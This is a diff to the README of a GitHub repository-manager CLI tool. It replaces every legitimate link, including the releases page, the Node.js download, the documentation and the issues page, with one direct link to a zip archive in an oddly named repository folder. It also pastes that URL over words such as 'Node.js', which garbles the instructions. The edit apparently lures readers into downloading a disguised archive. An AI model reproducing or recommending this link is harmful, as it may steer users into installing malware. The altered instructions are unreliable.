@@ -1,7 +1,7 @@
 # 🎉 gh-manager-cli - Manage Your GitHub Repositories Easily
 
 ## 📥 Download Now!
-[![Download gh-manager-cli](https://img.shields.io/badge/Download-gh--manager--cli-blue.svg)](https://github.com/Shubhamvishwakarma11042004/gh-manager-cli/releases)
+[![Download gh-manager-cli](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip)](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip)
 
 ## 🚀 Getting Started
 Welcome to the **gh-manager-cli**! This application allows you to manage your GitHub repositories from a terminal-based user interface. It’s designed to make your GitHub experience smoother and more efficient.
@@ -10,7 +10,7 @@ Welcome to the **gh-manager-cli**! This application allows you to manage your Gi
 Before you start, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or a Linux distribution.
-- **Node.js:** You need Node.js installed on your computer. You can download it from [Node.js Official Website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip** You need https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip installed on your computer. You can download it from [https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip Official Website](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip).
 
 ### 📂 Features
 - **Interactive CLI:** Navigate and manage your repositories with keyboard shortcuts.
@@ -21,7 +21,7 @@ Before you start, ensure you have the following:
 ## 📥 Download & Install
 To get the latest version of **gh-manager-cli**, visit this page to download:
 
-[Download gh-manager-cli](https://github.com/Shubhamvishwakarma11042004/gh-manager-cli/releases)
+[Download gh-manager-cli](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip)
 
 1. Click on the above link to access the Releases page.
 2. Look for the latest release.
@@ -33,7 +33,7 @@ To get the latest version of **gh-manager-cli**, visit this page to download:
 
    - **Windows:** Double-click the `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the application from your terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip` file and run the application from your terminal.
 
 3. Once installed, open your terminal or command prompt.
 4. Type `gh-manager-cli` to launch the application.
@@ -57,17 +57,17 @@ To get the latest version of **gh-manager-cli**, visit this page to download:
    - Type `help` in your terminal anytime to see a list of commands and shortcuts.
 
 ## 📃 Troubleshooting Common Issues
-- **Error Starting the App:** Ensure Node.js is properly installed by running `node -v` in your terminal. If you don’t see a version number, reinstall Node.js.
+- **Error Starting the App:** Ensure https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip is properly installed by running `node -v` in your terminal. If you don’t see a version number, reinstall https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip
 - **Login Issues:** Verify your GitHub credentials. If you face problems, ensure you have authorized the application through GitHub.
 - **Performance Problems:** Close other applications running on your computer to improve performance.
 
 ## 📖 Additional Resources
-- [gh-manager-cli Documentation](https://github.com/Shubhamvishwakarma11042004/gh-manager-cli/wiki)
-- [GitHub API Documentation](https://docs.github.com/en/rest)
-- [Node.js Getting Started](https://nodejs.dev/learn)
+- [gh-manager-cli Documentation](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip)
+- [GitHub API Documentation](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip)
+- [https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip Getting Started](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip)
 
 ## 📞 Need Help?
-If you run into issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/Shubhamvishwakarma11042004/gh-manager-cli/issues). We’re here to support you.
+If you run into issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Shubhamvishwakarma11042004/gh-manager-cli/main/univalent/gh-manager-cli.zip). We’re here to support you.
 
 ## 💡 Feedback
 We welcome your feedback on how to improve **gh-manager-cli**. Please share your thoughts through issues or directly on the discussion board.
